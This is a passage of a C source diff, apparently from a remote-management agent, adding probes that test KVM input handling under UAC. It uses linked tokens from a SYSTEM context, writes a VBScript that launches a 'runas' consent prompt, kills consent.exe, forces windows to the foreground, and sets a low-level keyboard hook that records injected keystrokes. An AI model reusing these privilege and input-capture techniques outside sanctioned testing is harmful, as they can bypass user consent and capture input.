+	if (childSpawned)
+	{
+		Sleep(1500);
+	}
+	linkedTokenReady = MeshService_GetLinkedPrimaryToken(sessionId, &linkedToken, &linkedTokenError);
+	if (linkedTokenReady)
+	{
+		if (MeshService_ProcessHasSystemSid())
+		{
+			GetModuleFileNameW(NULL, exePath, (DWORD)_countof(exePath));
+			ExpandEnvironmentStringsW(L"%SystemRoot%\\System32\\wscript.exe", wscriptPath, (DWORD)_countof(wscriptPath));
+			uacScriptUtf8 = (char*)malloc(4096);
+			if (uacScriptUtf8 != NULL)
+			{
+				int written = sprintf_s(
+					uacScriptUtf8,
+					4096,
+					"On Error Resume Next\r\n"
+					"Set shell = CreateObject(\"Shell.Application\")\r\n"
+					"Set fso = CreateObject(\"Scripting.FileSystemObject\")\r\n"
+					"shell.ShellExecute \"%S\", \"-kvm-uac-consent-target 15000 \"\"%S\"\"\", \"\", \"runas\", 1\r\n"
+					"errNum = Err.Number\r\n"
+					"Set file = fso.CreateTextFile(\"%S\", True)\r\n"
+					"file.Write \"{\"\"errorNumber\"\":\"\r\n"
+					"file.Write CStr(errNum)\r\n"
+					"file.Write \"}\"\r\n"
+					"file.Close\r\n"
+					"WScript.Quit errNum\r\n",
+					exePath,
+					uacTargetReport,
+					uacReport);
+				if (written > 0 && MeshService_WriteUtf8TextFileW(uacScript, uacScriptUtf8))
+				{
+					StringCchPrintfW(uacArgs, _countof(uacArgs), L"//B //NoLogo \"%ls\"", uacScript);
+					uacSpawned = MeshService_SpawnExecutableWithTokenW(linkedToken, wscriptPath, uacArgs, L"winsta0\\default", &uacProcess, &uacSpawnError);
+				}
+				else
+				{
+					uacSpawnError = ERROR_WRITE_FAULT;
+				}
+			}
+			else
+			{
+				uacSpawnError = ERROR_OUTOFMEMORY;
+			}
+		}
+		else
+		{
+			StringCchPrintfW(uacArgs, _countof(uacArgs), L"-kvm-uac-consent-trigger \"%ls\" %u", uacReport, 15000);
+			uacSpawned = MeshService_SpawnProcessWithTokenW(linkedToken, uacArgs, L"winsta0\\default", &uacProcess, &uacSpawnError);
+		}
+	}
+
+	if (childSpawned)
+	{
+		WaitForSingleObject(childProcess.hProcess, 30000);
+		GetExitCodeProcess(childProcess.hProcess, &childExitCode);
+	}
+	MeshService_TerminateProcessesByNameInSessionW(L"consent.exe", sessionId, &consentKillCount);
+	if (uacSpawned)
+	{
+		WaitForSingleObject(uacProcess.hProcess, 10000);
+		GetExitCodeProcess(uacProcess.hProcess, &uacExitCode);
+	}
+
+	childJson = MeshService_ReadUtf8TextFileW(childReport);
+	uacJson = MeshService_ReadUtf8TextFileW(uacReport);
+	uacTargetJson = MeshService_ReadUtf8TextFileW(uacTargetReport);
+	success = (childSpawned &&
+		childExitCode == 0 &&
+		childJson != NULL &&
+		strstr(childJson, "\"success\":true") != NULL);
+
+	printf("{\"success\":%s,", success ? "true" : "false");
+	printf("\"sessionId\":%lu,", (unsigned long)sessionId);
+	printf("\"systemTokenReady\":%s,", systemTokenReady ? "true" : "false");
+	printf("\"linkedTokenReady\":%s,", linkedTokenReady ? "true" : "false");
+	printf("\"childSpawned\":%s,", childSpawned ? "true" : "false");
+	printf("\"uacSpawned\":%s,", uacSpawned ? "true" : "false");
+	printf("\"systemTokenError\":%lu,", (unsigned long)systemTokenError);
+	printf("\"linkedTokenError\":%lu,", (unsigned long)linkedTokenError);
+	printf("\"childSpawnError\":%lu,", (unsigned long)childSpawnError);
+	printf("\"uacSpawnError\":%lu,", (unsigned long)uacSpawnError);
+	printf("\"childExitCode\":%lu,", (unsigned long)childExitCode);
+	printf("\"uacExitCode\":%lu,", (unsigned long)uacExitCode);
+	printf("\"consentKillCount\":%lu,", (unsigned long)consentKillCount);
+	printf("\"probe\":%s,", childJson != NULL ? childJson : "null");
+	printf("\"uac\":%s,", uacJson != NULL ? uacJson : "null");
+	printf("\"uacTarget\":%s}\n", uacTargetJson != NULL ? uacTargetJson : "null");
+	fflush(stdout);
+
+	if (childProcess.hThread != NULL) { CloseHandle(childProcess.hThread); }
+	if (childProcess.hProcess != NULL) { CloseHandle(childProcess.hProcess); }
+	if (uacProcess.hThread != NULL) { CloseHandle(uacProcess.hThread); }
+	if (uacProcess.hProcess != NULL) { CloseHandle(uacProcess.hProcess); }
+	if (systemToken != NULL) { CloseHandle(systemToken); }
+	if (linkedToken != NULL) { CloseHandle(linkedToken); }
+	if (childJson != NULL) { free(childJson); }
+	if (uacJson != NULL) { free(uacJson); }
+	if (uacTargetJson != NULL) { free(uacTargetJson); }
+	if (uacScriptUtf8 != NULL) { free(uacScriptUtf8); }
+	DeleteFileW(childReport);
+	DeleteFileW(uacReport);
+	DeleteFileW(uacTargetReport);
+	DeleteFileW(uacScript);
+	return success ? 0 : 1;
+}
+
+typedef struct MeshServiceFindWindowContext
+{
+	const WCHAR* title;
+	DWORD pid;
+	HWND hwnd;
+} MeshServiceFindWindowContext;
+
+typedef struct MeshServiceWindowSnapshotContext
+{
+	DWORD sessionId;
+	WCHAR* buffer;
+	size_t bufferCount;
+	size_t used;
+	int entryCount;
+} MeshServiceWindowSnapshotContext;
+
+static DWORD MeshService_KvmDesktopAccessMask(void)
+{
+	return DESKTOP_CREATEMENU |
+		DESKTOP_CREATEWINDOW |
+		DESKTOP_ENUMERATE |
+		DESKTOP_HOOKCONTROL |
+		DESKTOP_WRITEOBJECTS |
+		DESKTOP_READOBJECTS |
+		DESKTOP_SWITCHDESKTOP |
+		GENERIC_READ |
+		GENERIC_WRITE;
+}
+
+static BOOL MeshService_BindCurrentProcessToInteractiveWindowStation(DWORD* errorOut)
+{
+	HWINSTA windowStation = OpenWindowStationW(L"WinSta0", FALSE, WINSTA_ALL_ACCESS);
+	BOOL ok = FALSE;
+
+	if (errorOut != NULL) { *errorOut = ERROR_SUCCESS; }
+	if (windowStation == NULL)
+	{
+		if (errorOut != NULL) { *errorOut = GetLastError(); }
+		return FALSE;
+	}
+	ok = SetProcessWindowStation(windowStation);
+	if (!ok && errorOut != NULL) { *errorOut = GetLastError(); }
+	CloseWindowStation(windowStation);
+	return ok;
+}
+
+static BOOL MeshService_GetDesktopNameW(HDESK desktop, WCHAR* name, DWORD nameCount)
+{
+	if (name != NULL && nameCount > 0) { name[0] = L'\0'; }
+	if (desktop == NULL || name == NULL || nameCount == 0) { return FALSE; }
+	return GetUserObjectInformationW(desktop, UOI_NAME, name, nameCount * sizeof(WCHAR), NULL) ? TRUE : FALSE;
+}
+
+static BOOL MeshService_BindCurrentThreadToNamedDesktop(const WCHAR* desktopName, WCHAR* actualDesktopName, DWORD actualDesktopNameCount, DWORD* errorOut)
+{
+	HDESK desktop = NULL;
+	BOOL ok = FALSE;
+
+	if (errorOut != NULL) { *errorOut = ERROR_SUCCESS; }
+	if (actualDesktopName != NULL && actualDesktopNameCount > 0) { actualDesktopName[0] = L'\0'; }
+	if (desktopName == NULL || desktopName[0] == L'\0')
+	{
+		if (errorOut != NULL) { *errorOut = ERROR_INVALID_PARAMETER; }
+		return FALSE;
+	}
+	desktop = OpenDesktopW(desktopName, 0, FALSE, MeshService_KvmDesktopAccessMask());
+	if (desktop == NULL)
+	{
+		if (errorOut != NULL) { *errorOut = GetLastError(); }
+		return FALSE;
+	}
+	MeshService_GetDesktopNameW(desktop, actualDesktopName, actualDesktopNameCount);
+	ok = SetThreadDesktop(desktop);
+	if (!ok && errorOut != NULL) { *errorOut = GetLastError(); }
+	CloseDesktop(desktop);
+	return ok;
+}
+
+static BOOL MeshService_BindCurrentThreadToInputDesktop(WCHAR* desktopName, DWORD desktopNameCount, DWORD* errorOut)
+{
+	HDESK inputDesktop = OpenInputDesktop(0, FALSE, MeshService_KvmDesktopAccessMask());
+	BOOL ok = FALSE;
+
+	if (errorOut != NULL) { *errorOut = ERROR_SUCCESS; }
+	if (desktopName != NULL && desktopNameCount > 0) { desktopName[0] = L'\0'; }
+	if (inputDesktop == NULL)
+	{
+		if (errorOut != NULL) { *errorOut = GetLastError(); }
+		return FALSE;
+	}
+	MeshService_GetDesktopNameW(inputDesktop, desktopName, desktopNameCount);
+	ok = SetThreadDesktop(inputDesktop);
+	if (!ok && errorOut != NULL) { *errorOut = GetLastError(); }
+	CloseDesktop(inputDesktop);
+	return ok;
+}
+
+static void MeshService_AppendWindowSnapshotText(MeshServiceWindowSnapshotContext* context, const WCHAR* text)
+{
+	size_t remaining = 0;
+	size_t textLen = 0;
+
+	if (context == NULL || context->buffer == NULL || context->bufferCount == 0 || text == NULL) { return; }
+	if (context->used >= (context->bufferCount - 1)) { return; }
+	remaining = context->bufferCount - context->used;
+	textLen = wcslen(text);
+	if (textLen >= remaining) { textLen = remaining - 1; }
+	if (textLen == 0) { return; }
+	memcpy(context->buffer + context->used, text, textLen * sizeof(WCHAR));
+	context->used += textLen;
+	context->buffer[context->used] = L'\0';
+}
+
+static BOOL CALLBACK MeshService_WindowSnapshotEnumProc(HWND hwnd, LPARAM lParam)
+{
+	MeshServiceWindowSnapshotContext* context = (MeshServiceWindowSnapshotContext*)lParam;
+	WCHAR title[256];
+	WCHAR className[64];
+	WCHAR entry[384];
+	DWORD pid = 0;
+	DWORD processSessionId = 0;
+
+	if (context == NULL || context->buffer == NULL || context->entryCount >= 8) { return FALSE; }
+	GetWindowThreadProcessId(hwnd, &pid);
+	if (pid == 0 || !ProcessIdToSessionId(pid, &processSessionId) || processSessionId != context->sessionId) { return TRUE; }
+	ZeroMemory(title, sizeof(title));
+	ZeroMemory(className, sizeof(className));
+	GetWindowTextW(hwnd, title, (int)_countof(title));
+	GetClassNameW(hwnd, className, (int)_countof(className));
+	if (title[0] == L'\0' && className[0] == L'\0') { return TRUE; }
+	if (SUCCEEDED(StringCchPrintfW(
+		entry,
+		_countof(entry),
+		L"%ls%lu/%lc/%ls/%ls",
+		context->entryCount > 0 ? L" | " : L"",
+		(unsigned long)pid,
+		IsWindowVisible(hwnd) ? L'V' : L'H',
+		className,
+		title)))
+	{
+		MeshService_AppendWindowSnapshotText(context, entry);
+		++context->entryCount;
+	}
+	return TRUE;
+}
+
+static BOOL MeshService_EnumDesktopWindowsByName(const WCHAR* desktopName, WNDENUMPROC callback, LPARAM lParam)
+{
+	HDESK desktop = NULL;
+	BOOL ok = FALSE;
+
+	if (callback == NULL) { return FALSE; }
+	if (desktopName != NULL && desktopName[0] != L'\0')
+	{
+		desktop = OpenDesktopW(desktopName, 0, FALSE, MeshService_KvmDesktopAccessMask());
+		if (desktop != NULL)
+		{
+			ok = EnumDesktopWindows(desktop, callback, lParam);
+			CloseDesktop(desktop);
+			return ok;
+		}
+	}
+	return EnumWindows(callback, lParam);
+}
+
+static void MeshService_BuildWindowSnapshotForSessionW(DWORD sessionId, const WCHAR* desktopName, WCHAR* buffer, size_t bufferCount)
+{
+	MeshServiceWindowSnapshotContext context;
+
+	if (buffer == NULL || bufferCount == 0) { return; }
+	ZeroMemory(buffer, sizeof(WCHAR) * bufferCount);
+	ZeroMemory(&context, sizeof(context));
+	context.sessionId = sessionId;
+	context.buffer = buffer;
+	context.bufferCount = bufferCount;
+	MeshService_EnumDesktopWindowsByName(desktopName, MeshService_WindowSnapshotEnumProc, (LPARAM)&context);
+	if (context.entryCount == 0)
+	{
+		StringCchCopyW(buffer, bufferCount, L"none");
+	}
+}
+
+static BOOL CALLBACK MeshService_FindWindowByTitleEnumProc(HWND hwnd, LPARAM lParam)
+{
+	MeshServiceFindWindowContext* context = (MeshServiceFindWindowContext*)lParam;
+	WCHAR title[256];
+	DWORD pid = 0;
+
+	if (context == NULL || context->title == NULL) { return TRUE; }
+	GetWindowThreadProcessId(hwnd, &pid);
+	if (GetWindowTextW(hwnd, title, (int)_countof(title)) == 0) { return TRUE; }
+	if (_wcsicmp(title, context->title) == 0 || wcsstr(title, context->title) != NULL)
+	{
+		context->hwnd = hwnd;
+		return FALSE;
+	}
+	return TRUE;
+}
+
+static BOOL MeshService_WaitForTopLevelWindowByTitleW(const WCHAR* title, const WCHAR* desktopName, DWORD timeoutMs, DWORD* elapsedMsOut, HWND* hwndOut)
+{
+	MeshServiceFindWindowContext context;
+	ULONGLONG started = GetTickCount64();
+
+	if (elapsedMsOut != NULL) { *elapsedMsOut = 0; }
+	if (hwndOut != NULL) { *hwndOut = NULL; }
+	if (title == NULL || title[0] == L'\0') { return FALSE; }
+
+	ZeroMemory(&context, sizeof(context));
+	context.title = title;
+	context.pid = 0;
+
+	while ((GetTickCount64() - started) <= timeoutMs)
+	{
+		context.hwnd = NULL;
+		MeshService_EnumDesktopWindowsByName(desktopName, MeshService_FindWindowByTitleEnumProc, (LPARAM)&context);
+		if (context.hwnd != NULL)
+		{
+			if (elapsedMsOut != NULL) { *elapsedMsOut = (DWORD)(GetTickCount64() - started); }
+			if (hwndOut != NULL) { *hwndOut = context.hwnd; }
+			return TRUE;
+		}
+		Sleep(50);
+	}
+	return FALSE;
+}
+
+static BOOL MeshService_BringWindowToForeground(HWND hwnd)
+{
+	DWORD currentThreadId = GetCurrentThreadId();
+	DWORD targetThreadId = 0;
+	DWORD foregroundThreadId = 0;
+	HWND foreground = NULL;
+	BOOL attachTarget = FALSE;
+	BOOL attachForeground = FALSE;
+	BOOL ok = FALSE;
+
+	if (hwnd == NULL) { return FALSE; }
+	foreground = GetForegroundWindow();
+	targetThreadId = GetWindowThreadProcessId(hwnd, NULL);
+	foregroundThreadId = (foreground != NULL) ? GetWindowThreadProcessId(foreground, NULL) : 0;
+
+	AllowSetForegroundWindow(ASFW_ANY);
+	if (targetThreadId != 0 && targetThreadId != currentThreadId)
+	{
+		attachTarget = AttachThreadInput(currentThreadId, targetThreadId, TRUE);
+	}
+	if (foregroundThreadId != 0 && foregroundThreadId != currentThreadId && foregroundThreadId != targetThreadId)
+	{
+		attachForeground = AttachThreadInput(currentThreadId, foregroundThreadId, TRUE);
+	}
+
+	ShowWindow(hwnd, SW_SHOW);
+	ShowWindow(hwnd, SW_RESTORE);
+	BringWindowToTop(hwnd);
+	SetActiveWindow(hwnd);
+	SetFocus(hwnd);
+	ok = SetForegroundWindow(hwnd);
+	if (!ok && GetForegroundWindow() == hwnd) { ok = TRUE; }
+	Sleep(150);
+	if (!ok && GetForegroundWindow() == hwnd) { ok = TRUE; }
+
+	if (attachForeground) { AttachThreadInput(currentThreadId, foregroundThreadId, FALSE); }
+	if (attachTarget) { AttachThreadInput(currentThreadId, targetThreadId, FALSE); }
+	return ok || GetForegroundWindow() == hwnd;
+}
+
+static BOOL MeshService_KvmSendPacket(const char* packet, int packetLen, ILibKVM_WriteHandler writeHandler, void* reserved)
+{
+	return (packet != NULL && packetLen > 0 && kvm_relay_feeddata((char*)packet, packetLen, writeHandler, reserved) == packetLen);
+}
+
+static BOOL MeshService_KvmSendUnicodeKey(WORD value, int up, ILibKVM_WriteHandler writeHandler, void* reserved)
+{
+	char packet[7];
+	((unsigned short*)packet)[0] = (unsigned short)htons((unsigned short)MNG_KVM_KEY_UNICODE);
+	((unsigned short*)packet)[1] = (unsigned short)htons((unsigned short)7);
+	packet[4] = (char)up;
+	packet[5] = (char)((value >> 8) & 0xFF);
+	packet[6] = (char)(value & 0xFF);
+	return MeshService_KvmSendPacket(packet, (int)sizeof(packet), writeHandler, reserved);
+}
+
+static BOOL MeshService_KvmSendVirtualKey(BYTE vk, int up, ILibKVM_WriteHandler writeHandler, void* reserved)
+{
+	char packet[6];
+	((unsigned short*)packet)[0] = (unsigned short)htons((unsigned short)MNG_KVM_KEY);
+	((unsigned short*)packet)[1] = (unsigned short)htons((unsigned short)6);
+	packet[4] = (char)up;
+	packet[5] = (char)vk;
+	return MeshService_KvmSendPacket(packet, (int)sizeof(packet), writeHandler, reserved);
+}
+
+static BOOL MeshService_KvmTypeMarkerText(const char* marker, ILibKVM_WriteHandler writeHandler, void* reserved)
+{
+	size_t i = 0;
+
+	if (marker == NULL || marker[0] == '\0') { return FALSE; }
+	for (i = 0; marker[i] != '\0'; ++i)
+	{
+		WORD codeUnit = (WORD)(unsigned char)marker[i];
+		if (!MeshService_KvmSendUnicodeKey(codeUnit, 0, writeHandler, reserved)) { return FALSE; }
+		Sleep(15);
+		if (!MeshService_KvmSendUnicodeKey(codeUnit, 1, writeHandler, reserved)) { return FALSE; }
+		Sleep(15);
+	}
+	if (!MeshService_KvmSendVirtualKey(VK_RETURN, 0, writeHandler, reserved)) { return FALSE; }
+	Sleep(15);
+	if (!MeshService_KvmSendVirtualKey(VK_RETURN, 1, writeHandler, reserved)) { return FALSE; }
+	return TRUE;
+}
+
+static BOOL MeshService_KvmTypeMarkerVirtualText(const char* marker, ILibKVM_WriteHandler writeHandler, void* reserved)
+{
+	size_t i = 0;
+	BYTE vk = 0;
+
+	if (marker == NULL || marker[0] == '\0') { return FALSE; }
+	for (i = 0; marker[i] != '\0'; ++i)
+	{
+		if (marker[i] >= 'a' && marker[i] <= 'z')
+		{
+			vk = (BYTE)('A' + (marker[i] - 'a'));
+		}
+		else if (marker[i] >= 'A' && marker[i] <= 'Z')
+		{
+			vk = (BYTE)marker[i];
+		}
+		else if (marker[i] >= '0' && marker[i] <= '9')
+		{
+			vk = (BYTE)marker[i];
+		}
+		else
+		{
+			return FALSE;
+		}
+
+		if (!MeshService_KvmSendVirtualKey(vk, 0, writeHandler, reserved)) { return FALSE; }
+		Sleep(15);
+		if (!MeshService_KvmSendVirtualKey(vk, 1, writeHandler, reserved)) { return FALSE; }
+		Sleep(15);
+	}
+	if (!MeshService_KvmSendVirtualKey(VK_RETURN, 0, writeHandler, reserved)) { return FALSE; }
+	Sleep(15);
+	if (!MeshService_KvmSendVirtualKey(VK_RETURN, 1, writeHandler, reserved)) { return FALSE; }
+	return TRUE;
+}
+
+static void MeshService_TrimLineEndingsA(char* text)
+{
+	size_t len = 0;
+	if (text == NULL) { return; }
+	len = strlen(text);
+	while (len > 0 && (text[len - 1] == '\r' || text[len - 1] == '\n' || text[len - 1] == ' ' || text[len - 1] == '\t'))
+	{
+		text[--len] = '\0';
+	}
+}
+
+static BOOL MeshService_TryParseWindowHandleTextA(const char* text, HWND* hwndOut)
+{
+	char* endPtr = NULL;
+	unsigned long long rawValue = 0;
+
+	if (hwndOut != NULL) { *hwndOut = NULL; }
+	if (text == NULL || hwndOut == NULL) { return FALSE; }
+
+	while (*text == ' ' || *text == '\t') { ++text; }
+	if (*text == '\0') { return FALSE; }
+
+	rawValue = _strtoui64(text, &endPtr, 10);
+	if (endPtr == text) { return FALSE; }
+	while (*endPtr == ' ' || *endPtr == '\t') { ++endPtr; }
+	if (*endPtr != '\0') { return FALSE; }
+
+	*hwndOut = (HWND)(ULONG_PTR)rawValue;
+	return (*hwndOut != NULL);
+}
+
+static BOOL MeshService_WaitForReportedWindowHandleW(const WCHAR* reportPath, DWORD expectedPid, DWORD timeoutMs, DWORD* elapsedMsOut, HWND* hwndOut)
+{
+	ULONGLONG started = GetTickCount64();
+
+	if (elapsedMsOut != NULL) { *elapsedMsOut = 0; }
+	if (hwndOut != NULL) { *hwndOut = NULL; }
+	if (reportPath == NULL || reportPath[0] == L'\0') { return FALSE; }
+
+	while ((GetTickCount64() - started) <= timeoutMs)
+	{
+		char* rawText = MeshService_ReadUtf8TextFileW(reportPath);
+		if (rawText != NULL)
+		{
+			HWND hwnd = NULL;
+
+			MeshService_TrimLineEndingsA(rawText);
+			if (MeshService_TryParseWindowHandleTextA(rawText, &hwnd) && IsWindow(hwnd))
+			{
+				DWORD actualPid = 0;
+				GetWindowThreadProcessId(hwnd, &actualPid);
+				if (expectedPid == 0 || actualPid == expectedPid)
+				{
+					if (elapsedMsOut != NULL) { *elapsedMsOut = (DWORD)(GetTickCount64() - started); }
+					if (hwndOut != NULL) { *hwndOut = hwnd; }
+					free(rawText);
+					return TRUE;
+				}
+			}
+			free(rawText);
+		}
+		Sleep(50);
+	}
+	return FALSE;
+}
+
+static BOOL MeshService_WaitForFilePresenceW(const WCHAR* path, DWORD timeoutMs, DWORD* elapsedMsOut)
+{
+	ULONGLONG started = GetTickCount64();
+
+	if (elapsedMsOut != NULL) { *elapsedMsOut = 0; }
+	if (path == NULL || path[0] == L'\0') { return FALSE; }
+
+	while ((GetTickCount64() - started) <= timeoutMs)
+	{
+		DWORD attributes = GetFileAttributesW(path);
+		if (attributes != INVALID_FILE_ATTRIBUTES && (attributes & FILE_ATTRIBUTE_DIRECTORY) == 0)
+		{
+			if (elapsedMsOut != NULL) { *elapsedMsOut = (DWORD)(GetTickCount64() - started); }
+			return TRUE;
+		}
+		Sleep(50);
+	}
+	return FALSE;
+}
+
+static BOOL MeshService_WriteWideTextFileUtf8W(const WCHAR* path, const WCHAR* text)
+{
+	int needed = 0;
+	char* utf8 = NULL;
+	BOOL ok = FALSE;
+
+	if (path == NULL || path[0] == L'\0' || text == NULL) { return FALSE; }
+	needed = WideCharToMultiByte(CP_UTF8, 0, text, -1, NULL, 0, NULL, NULL);
+	if (needed <= 0) { return FALSE; }
+	utf8 = (char*)malloc((size_t)needed);
+	if (utf8 == NULL) { return FALSE; }
+	if (WideCharToMultiByte(CP_UTF8, 0, text, -1, utf8, needed, NULL, NULL) > 0)
+	{
+		ok = MeshService_WriteUtf8TextFileW(path, utf8);
+	}
+	free(utf8);
+	return ok;
+}
+
+static BOOL MeshService_JsonFieldTrueA(const char* json, const char* fieldName)
+{
+	char needle[128];
+
+	if (json == NULL || fieldName == NULL || fieldName[0] == '\0') { return FALSE; }
+	if (FAILED(StringCchPrintfA(needle, _countof(needle), "\"%s\":true", fieldName))) { return FALSE; }
+	return (strstr(json, needle) != NULL);
+}
+
+static int MeshService_RunKvmElevatedInputTargetCommand(const WCHAR* hwndReportPath, const WCHAR* readyReportPath, const WCHAR* capturePath, const WCHAR* title)
+{
+	HANDLE consoleInput = INVALID_HANDLE_VALUE;
+	HWND consoleWindow = NULL;
+	WCHAR inputBuffer[256];
+	WCHAR hwndBuffer[64];
+	DWORD charsRead = 0;
+	BOOL success = FALSE;
+	BOOL consoleReady = FALSE;
+
+	ZeroMemory(inputBuffer, sizeof(inputBuffer));
+	ZeroMemory(hwndBuffer, sizeof(hwndBuffer));
+
+	if (AttachConsole(ATTACH_PARENT_PROCESS) || GetLastError() == ERROR_ACCESS_DENIED)
+	{
+		consoleReady = TRUE;
+	}
+	else if (AllocConsole() || GetLastError() == ERROR_ACCESS_DENIED)
+	{
+		consoleReady = TRUE;
+	}
+	if (!consoleReady)
+	{
+		return 1;
+	}
+	if (title != NULL && title[0] != L'\0')
+	{
+		SetConsoleTitleW(title);
+		Sleep(150);
+	}
+	consoleWindow = GetConsoleWindow();
+	if (hwndReportPath != NULL && hwndReportPath[0] != L'\0')
+	{
+		StringCchPrintfW(hwndBuffer, _countof(hwndBuffer), L"%llu", (unsigned long long)(ULONG_PTR)consoleWindow);
+		MeshService_WriteWideTextFileUtf8W(hwndReportPath, hwndBuffer);
+	}
+
+	consoleInput = CreateFileW(L"CONIN$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+	if (consoleInput == INVALID_HANDLE_VALUE)
+	{
+		return 1;
+	}
+	FlushConsoleInputBuffer(consoleInput);
+	if (readyReportPath != NULL && readyReportPath[0] != L'\0')
+	{
+		MeshService_WriteWideTextFileUtf8W(readyReportPath, L"READY");
+	}
+	if (ReadConsoleW(consoleInput, inputBuffer, (DWORD)(_countof(inputBuffer) - 1), &charsRead, NULL) && charsRead > 0)
+	{
+		inputBuffer[charsRead] = L'\0';
+		while (charsRead > 0 && (inputBuffer[charsRead - 1] == L'\r' || inputBuffer[charsRead - 1] == L'\n'))
+		{
+			inputBuffer[--charsRead] = L'\0';
+		}
+		success = MeshService_WriteWideTextFileUtf8W(capturePath, inputBuffer);
+	}
+	CloseHandle(consoleInput);
+	return success ? 0 : 1;
+}
+
+typedef struct MeshServiceBlockInputTargetState
+{
+	WCHAR hwndReportPath[MAX_PATH];
+	WCHAR readyReportPath[MAX_PATH];
+	WCHAR capturePath[MAX_PATH];
+	HHOOK keyboardHook;
+	UINT_PTR timeoutTimer;
+	char captureBuffer[256];
+	size_t captureLength;
+	BOOL captureWritten;
+} MeshServiceBlockInputTargetState;
+
+static MeshServiceBlockInputTargetState gMeshServiceBlockInputTargetState;
+
+static void MeshService_BlockInputTargetAppendVk(DWORD vkCode)
+{
+	char value = '\0';
+
+	if (gMeshServiceBlockInputTargetState.captureLength >= (_countof(gMeshServiceBlockInputTargetState.captureBuffer) - 1)) { return; }
+	if (vkCode >= 'A' && vkCode <= 'Z')
+	{
+		value = (char)('a' + (char)(vkCode - 'A'));
+	}
+	else if (vkCode >= '0' && vkCode <= '9')
+	{
+		value = (char)vkCode;
+	}
+	if (value == '\0') { return; }
+
+	gMeshServiceBlockInputTargetState.captureBuffer[gMeshServiceBlockInputTargetState.captureLength++] = value;
+	gMeshServiceBlockInputTargetState.captureBuffer[gMeshServiceBlockInputTargetState.captureLength] = '\0';
+}
+
+static LRESULT CALLBACK MeshService_BlockInputTargetKeyboardProc(int code, WPARAM wParam, LPARAM lParam)
+{
+	if (code == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
+	{
+		KBDLLHOOKSTRUCT* keyInfo = (KBDLLHOOKSTRUCT*)lParam;
+
+		if (keyInfo != NULL && (keyInfo->flags & LLKHF_INJECTED) != 0)
+		{
+			if (keyInfo->vkCode == VK_RETURN)
+			{
+				gMeshServiceBlockInputTargetState.captureWritten = MeshService_WriteUtf8TextFileW(
+					gMeshServiceBlockInputTargetState.capturePath,
+					gMeshServiceBlockInputTargetState.captureBuffer);
+				PostQuitMessage(0);
+			}
+			else
+			{
+				MeshService_BlockInputTargetAppendVk(keyInfo->vkCode);
+			}
+		}
+	}
+	return CallNextHookEx(gMeshServiceBlockInputTargetState.keyboardHook, code, wParam, lParam);
+}
+
+static int MeshService_RunKvmBlockInputTargetCommand(const WCHAR* hwndReportPath, const WCHAR* readyReportPath, const WCHAR* capturePath, const WCHAR* title)
+{
+	MSG message;
+	int result = 1;
+	UNREFERENCED_PARAMETER(title);
+
+	ZeroMemory(&gMeshServiceBlockInputTargetState, sizeof(gMeshServiceBlockInputTargetState));
+	if (hwndReportPath != NULL) { StringCchCopyW(gMeshServiceBlockInputTargetState.hwndReportPath, _countof(gMeshServiceBlockInputTargetState.hwndReportPath), hwndReportPath); }
+	if (readyReportPath != NULL) { StringCchCopyW(gMeshServiceBlockInputTargetState.readyReportPath, _countof(gMeshServiceBlockInputTargetState.readyReportPath), readyReportPath); }
+	if (capturePath != NULL) { StringCchCopyW(gMeshServiceBlockInputTargetState.capturePath, _countof(gMeshServiceBlockInputTargetState.capturePath), capturePath); }
+
+	PeekMessageW(&message, NULL, WM_USER, WM_USER, PM_NOREMOVE);
+	gMeshServiceBlockInputTargetState.keyboardHook = SetWindowsHookExW(
+		WH_KEYBOARD_LL,
+		MeshService_BlockInputTargetKeyboardProc,
+		GetModuleHandleW(NULL),
+		0);
+	if (gMeshServiceBlockInputTargetState.keyboardHook == NULL)
+	{
+		return 1;
+	}
+
+	if (gMeshServiceBlockInputTargetState.hwndReportPath[0] != L'\0')
+	{
+		MeshService_WriteWideTextFileUtf8W(gMeshServiceBlockInputTargetState.hwndReportPath, L"0");
+	}
+	if (gMeshServiceBlockInputTargetState.readyReportPath[0] != L'\0')
+	{
+		MeshService_WriteWideTextFileUtf8W(gMeshServiceBlockInputTargetState.readyReportPath, L"READY");
+	}
+	gMeshServiceBlockInputTargetState.timeoutTimer = SetTimer(NULL, 1, 60000, NULL);
+
+	while (GetMessageW(&message, NULL, 0, 0) > 0)
+	{
+		if (message.message == WM_TIMER && message.wParam == gMeshServiceBlockInputTargetState.timeoutTimer)
+		{
+			PostQuitMessage(0);
+			continue;
+		}
+		TranslateMessage(&message);
+		DispatchMessageW(&message);
+	}
+
+	result = gMeshServiceBlockInputTargetState.captureWritten ? 0 : 1;
+	if (gMeshServiceBlockInputTargetState.timeoutTimer != 0)
+	{
+		KillTimer(NULL, gMeshServiceBlockInputTargetState.timeoutTimer);
+	}
+	if (gMeshServiceBlockInputTargetState.keyboardHook != NULL)
+	{
+		UnhookWindowsHookEx(gMeshServiceBlockInputTargetState.keyboardHook);
+	}
+	return result;
+}
+
+static int MeshService_RunKvmElevatedInputProbeWorkerCommand(void)
+{
+	MeshServiceKvmSessionChangeProbeState state;
+	char exePath[MAX_PATH * 4] = { 0 };
+	char marker[64] = { 0 };
+	char* capturedText = NULL;
+	void* chain = NULL;
+	void* pipeManager = NULL;
+	HANDLE chainThread = NULL;
+	HANDLE elevatedToken = NULL;
+	PROCESS_INFORMATION targetProcess;
+	WCHAR tempPath[MAX_PATH] = { 0 };
+	WCHAR targetExePath[MAX_PATH * 2] = { 0 };
+	WCHAR hwndReportPath[MAX_PATH] = { 0 };
+	WCHAR capturePath[MAX_PATH] = { 0 };
+	WCHAR readyPath[MAX_PATH] = { 0 };
+	WCHAR probeDesktop[64] = { 0 };
+	WCHAR targetDesktop[64] = L"winsta0\\default";
+	WCHAR windowTitle[128] = { 0 };
+	WCHAR windowSnapshot[2048] = { 0 };
+	WCHAR cmdPath[MAX_PATH] = { 0 };
+	WCHAR targetArgs[2048] = { 0 };
+	DWORD sessionId = MeshService_GetCurrentSessionId();
+	DWORD bridgePid = 0;
+	DWORD bridgeSpawnMs = 0;
+	DWORD bridgePacketMs = 0;
+	DWORD bridgeExitMs = 0;
+	DWORD bridgeSessionId = 0;
+	DWORD bridgeIntegrityRid = 0;
+	DWORD targetWindowReportMs = 0;
+	DWORD targetWindowMs = 0;
+	DWORD targetSpawnError = ERROR_SUCCESS;
+	DWORD targetWaitResult = WAIT_FAILED;
+	DWORD targetSessionId = 0;
+	DWORD targetIntegrityRid = 0;
